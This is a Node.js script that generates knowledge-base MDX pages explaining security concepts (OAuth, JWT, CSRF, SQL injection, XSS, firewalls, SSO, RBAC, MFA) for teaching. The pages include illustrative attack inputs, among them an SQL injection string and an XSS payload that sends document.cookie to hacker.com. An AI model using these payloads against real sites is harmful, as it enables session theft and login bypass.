import fs from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const __filename = fileURLToPath(import.meta.url)
const __dirname = path.dirname(__filename)
const PROJECT_ROOT = path.resolve(__dirname, '..')
const ROUTE_DIR = path.join(PROJECT_ROOT, 'src', 'features', 'kb', 'routes', 'KB')

const contentMap = {
  '65. Comparison Pages (Reference)/Authentication vs authorisation/index.mdx': `---
title: Authentication vs Authorization
description: The fundamental difference between identity verification and access control.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="Authentication vs Authorization">

These two terms are constantly confused in cybersecurity, but they serve two entirely different, sequential purposes in system design.

<Callout icon="info" title="The Airport Metaphor">
  **Authentication (AuthN)** is showing your Passport at the TSA checkpoint. It proves *who you are*.
  
  **Authorization (AuthZ)** is handing your boarding pass to the flight attendant at the gate. It proves *what you are allowed to do* (board Flight 104 in Seat 12A).
</Callout>

## Detailed Comparison

<ComparisonTable 
  headers={['Aspect', 'Authentication (AuthN)', 'Authorization (AuthZ)']}
  rows={[
    ['Purpose', 'Verifies identity (Who is this?)', 'Verifies permissions (What can they do?)'],
    ['Order of Operations', 'Always happens FIRST.', 'Always happens SECOND.'],
    ['Common Technologies', 'Passwords, MFA, Biometrics, Passkeys.', 'RBAC, ABAC, JWT Scopes, OAuth 2.0.'],
    ['Example Error Code', 'HTTP 401 Unauthorized (Technically means Unauthenticated).', 'HTTP 403 Forbidden.']
  ]}
/>

</TechnologyTemplate>
`,
  '53. Authentication, Identity & Access/OAuth 2.0/index.mdx': `---
title: OAuth 2.0
description: The industry-standard protocol for authorization.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="OAuth 2.0">

OAuth 2.0 is the industry-standard protocol for authorization. It allows a user to grant a third-party website or application access to their protected resources, without necessarily revealing their long-term credentials or even their identity.

<Callout icon="success" title="The Problem it Solves">
  Before OAuth, if you wanted a new app to read your Google Contacts, you literally had to give the app your Google Password. The app could then read your emails, delete your photos, or lock you out.
  
  OAuth fixes this by issuing a **scopable, revocable Access Token** (e.g., "This token can ONLY read contacts, and expires in 1 hour").
</Callout>

## The Four Roles

<ComparisonTable 
  headers={['Role', 'Description', 'Example']}
  rows={[
    ['Resource Owner', 'The user who authorizes an application to access their account.', 'You.'],
    ['Client', 'The application making the request on behalf of the Resource Owner.', 'Spotify (wanting to post to your Facebook timeline).'],
    ['Authorization Server', 'The server issuing access tokens to the client after successfully authenticating the resource owner.', 'accounts.google.com'],
    ['Resource Server', 'The server hosting the protected resources, capable of accepting and responding to protected resource requests using access tokens.', 'The Google Contacts API.']
  ]}
/>

</TechnologyTemplate>
`,
  '53. Authentication, Identity & Access/JWT/index.mdx': `---
title: JSON Web Tokens (JWT)
description: A compact, URL-safe means of representing claims to be transferred between two parties.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="JSON Web Tokens (JWT)">

JSON Web Token (JWT, pronounced "jot") is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.

<Callout icon="error" title="JWTs are NOT Encrypted">
  Unless you explicitly use JWE (JSON Web Encryption), the payload of a JWT is simply Base64 encoded, meaning anyone who captures it can instantly decode and read it. **Never put passwords or Social Security Numbers inside a JWT payload.**
</Callout>

## Structure of a JWT

A JWT consists of three parts separated by dots (\`.\`):

<ComparisonTable 
  headers={['Part', 'Description', 'Example Content']}
  rows={[
    ['Header', 'Defines the type of token and the signing algorithm used (like HMAC SHA256 or RSA).', \`{"alg": "HS256", "typ": "JWT"}\`],
    ['Payload (Claims)', 'The actual data you want to transmit (e.g., User ID, roles, expiration timestamp).', \`{"userId": "123", "role": "admin", "exp": 1690000000}\`],
    ['Signature', 'A cryptographic hash of the Header + Payload + Your Secret Server Key. This proves the token was not tampered with.', \`SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\`]
  ]}
/>

## Statelessness

Because the JWT contains the signature, the Backend API does not need to query the database to check if the user's session is valid. It simply runs the math to verify the signature. This makes scaling APIs horizontally incredibly easy.

</TechnologyTemplate>
`,
  '42. Cybersecurity Fundamentals/42.2 Web Security/CSRF/index.mdx': `---
title: Cross-Site Request Forgery (CSRF)
description: An attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="Cross-Site Request Forgery (CSRF)">

Cross-Site Request Forgery (CSRF) is a vulnerability that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.

<Callout icon="warning" title="The Mechanism">
  If you are logged into your bank, your browser stores a Session Cookie. If you open a new tab and visit \`evil-hacker.com\`, that site can execute a hidden HTTP POST to \`bank.com/transfer?amount=1000&to=hacker\`. 
  
  Because your browser automatically attaches your Bank Cookie to the request, the Bank thinks *you* made the request intentionally!
</Callout>

## Prevention Methods

<ComparisonTable 
  headers={['Method', 'How it Works']}
  rows={[
    ['SameSite Cookies', 'Setting the cookie attribute \`SameSite=Lax\` or \`Strict\` prevents the browser from sending the cookie if the request originated from a different domain. (Modern Default).'],
    ['Anti-CSRF Tokens', 'The server generates a unique, cryptographically strong token for the user\\'s session and embeds it in HTML forms. The attacker cannot guess this token.'],
    ['Double Submit Cookie', 'Send the token both in a cookie and as a request parameter. The server verifies they match.']
  ]}
/>

</TechnologyTemplate>
`,
  '42. Cybersecurity Fundamentals/42.2 Web Security/SQL injection/index.mdx': `---
title: SQL Injection (SQLi)
description: A code injection technique that might destroy your database.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="SQL Injection (SQLi)">

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access.

<Callout icon="error" title="The Cause: String Concatenation">
  SQL Injection ONLY happens when you build SQL queries by manually concatenating user input as strings. 
  
  \`"SELECT * FROM Users WHERE name = '" + userInput + "';"\`
</Callout>

## The Exploit

If the \`userInput\` is exactly: \`' OR '1'='1\`

The resulting query executed on the database becomes:
\`SELECT * FROM Users WHERE name = '' OR '1'='1';\`

Because '1'='1' is always true, the database returns **every single user in the table**, bypassing authentication completely.

## The Solution: Parameterized Queries (Prepared Statements)

Never concatenate strings. Always use Prepared Statements. The database driver sends the SQL logic and the user data to the database engine separately. The database engine treats the data strictly as a literal string, refusing to execute it as code.

\`db.query('SELECT * FROM Users WHERE name = ?', [userInput]);\`

</TechnologyTemplate>
`,
  '42. Cybersecurity Fundamentals/42.2 Web Security/XSS (stored/index.mdx': `---
title: Cross-Site Scripting (XSS)
description: A type of security vulnerability typically found in web applications allowing attackers to inject client-side scripts.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="Cross-Site Scripting (XSS)">

Cross-Site Scripting (XSS) vulnerabilities occur when a web application gathers malicious data from a user without properly validating or encoding it, and then displays it to other users in their web browser.

<Callout icon="warning" title="The Exploit">
  The attacker writes a comment on a forum containing: \`<script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>\`.
  
  If the server doesn't sanitize this, every time a normal user views the forum thread, their browser executes the script and silently sends their login cookies to the hacker.
</Callout>

## Types of XSS

<ComparisonTable 
  headers={['Type', 'Description']}
  rows={[
    ['Stored XSS (Persistent)', 'The malicious script is permanently saved to the database (e.g., in a forum post or profile bio). Maximum damage.'],
    ['Reflected XSS (Non-Persistent)', 'The script is embedded in the URL (e.g., \`?search=<script>...\`). The attacker must trick the victim into clicking the link.'],
    ['DOM-based XSS', 'The vulnerability exists entirely in the client-side JavaScript code (e.g., using \`innerHTML\`), never touching the server.']
  ]}
/>

</TechnologyTemplate>
`,
  '42. Cybersecurity Fundamentals/42.3 Network Security/Firewalls/index.mdx': `---
title: Firewalls
description: A network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="Firewalls">

A firewall is a network security device that monitors and filters incoming and outgoing network traffic based on an organization's previously established security policies. At its most basic, a firewall is essentially the barrier that sits between a private internal network and the public Internet.

<Callout icon="info" title="The Default Deny Rule">
  The fundamental philosophy of a firewall is "Default Deny". It drops all traffic instantly. You must explicitly write rules (Allow Port 80, Allow Port 443) to poke holes through the firewall.
</Callout>

## Generations of Firewalls

<ComparisonTable 
  headers={['Generation', 'Description']}
  rows={[
    ['Packet Filtering (Stateless)', 'Looks at individual packets in isolation. Checks the Source IP, Destination IP, and Port. Extremely fast, but easily fooled by IP spoofing.'],
    ['Stateful Inspection', 'Maintains a table of active connections. If a machine inside the network requests a website, the firewall remembers this state and allows the website\\'s response back in.'],
    ['Next-Generation Firewall (NGFW)', 'Deep Packet Inspection (Layer 7). It doesn\\'t just look at IPs and ports; it opens the packet to see if it contains a virus, or blocks specific applications (like blocking Facebook but allowing Google).']
  ]}
/>

</TechnologyTemplate>
`,
  '53. Authentication, Identity & Access/SSO/index.mdx': `---
title: Single Sign-On (SSO)
description: An authentication scheme that allows a user to log in with a single ID and password to any of several related, yet independent, software systems.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="Single Sign-On (SSO)">

Single sign-on (SSO) is an authentication scheme that allows a user to log in with a single ID and password to any of several related, yet independent, software systems. True single sign-on allows the user to log in once and access services without re-entering authentication factors.

<Callout icon="success" title="Enterprise Security">
  SSO is mandatory for large enterprises. Instead of an employee having 50 different passwords for Jira, Slack, Zoom, and Workday, they log into the Identity Provider (Okta, Azure AD) once. If the employee is fired, IT disables the central account, instantly revoking access to all 50 apps.
</Callout>

## Underlying Protocols

SSO is not a protocol itself; it is a concept implemented using specific protocols:

<ComparisonTable 
  headers={['Protocol', 'Best For', 'Format']}
  rows={[
    ['SAML (Security Assertion Markup Language)', 'Legacy Enterprise Apps, XML-based. Very heavy but extremely secure.', 'XML'],
    ['OpenID Connect (OIDC)', 'Modern Web Apps and Mobile Apps. Built on top of OAuth 2.0. Lightweight.', 'JSON / JWT']
  ]}
/>

</TechnologyTemplate>
`,
  '53. Authentication, Identity & Access/RBAC/index.mdx': `---
title: Role-Based Access Control (RBAC)
description: An approach to restricting system access to authorized users based on their role within an organization.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="Role-Based Access Control (RBAC)">

Role-based access control (RBAC) is a policy-neutral access-control mechanism defined around roles and privileges. The components of RBAC such as role-permissions, user-role and role-role relationships make it simple to perform user assignments.

<Callout icon="info" title="Users vs Roles vs Permissions">
  In RBAC, you never assign a Permission (e.g., "CanDeleteUser") directly to a User (e.g., "Alice").
  
  Instead, you assign the Permission to a Role ("Admin"), and you assign the User to the Role. This makes managing thousands of employees trivial.
</Callout>

## RBAC vs ABAC

<ComparisonTable 
  headers={['Model', 'Description', 'Example Rule']}
  rows={[
    ['RBAC (Role-Based)', 'Permissions are strictly tied to static Roles.', 'Only users with the "Manager" role can approve expenses.'],
    ['ABAC (Attribute-Based)', 'Permissions are dynamically evaluated based on attributes of the user, the resource, and the environment.', 'Only users in the "Finance" department can approve expenses, AND only if they are accessing the system from the office IP address, AND only during business hours.']
  ]}
/>

</TechnologyTemplate>
`,
  '53. Authentication, Identity & Access/MFA/index.mdx': `---
title: Multi-Factor Authentication (MFA)
description: An electronic authentication method in which a user is granted access only after successfully presenting two or more pieces of evidence.
---
import { TechnologyTemplate } from '@/features/kb/components/templates/TechnologyTemplate'

<TechnologyTemplate title="Multi-Factor Authentication (MFA)">

Multi-factor authentication (MFA) is an electronic authentication method in which a computer user is granted access to a website or application only after successfully presenting two or more pieces of evidence (or factors) to an authentication mechanism.

<Callout icon="success" title="99.9% Protection">
  Microsoft reported that enabling MFA blocks 99.9% of all automated, mass-scale account compromise attacks. If a hacker guesses your password, they are still stopped dead without your phone.
</Callout>

## The Three Factors

To be true MFA, you must require elements from at least TWO DIFFERENT categories below (Requiring two passwords is just Single-Factor Authentication done twice).

<ComparisonTable 
  headers={['Factor', 'Description', 'Examples']}
  rows={[
    ['Knowledge (Something you know)', 'Information only the user possesses.', 'Passwords, PINs, Security Questions.'],
    ['Possession (Something you have)', 'A physical object the user carries.', 'Smartphone (Google Authenticator TOTP), Hardware Security Key (YubiKey), Smartcard.'],
    ['Inherence (Something you are)', 'Biological characteristics of the user.', 'Fingerprint, FaceID, Retina Scan.']
  ]}
/>

</TechnologyTemplate>
`,
}

async function generateMega5() {
  for (const [relativePath, content] of Object.entries(contentMap)) {
    const fullPath = path.join(ROUTE_DIR, relativePath)
    await fs.mkdir(path.dirname(fullPath), { recursive: true })
    await fs.writeFile(fullPath, content, 'utf-8')
    console.log(`Generated thorough content for ${relativePath}`)
  }
}

generateMega5().catch(console.error)
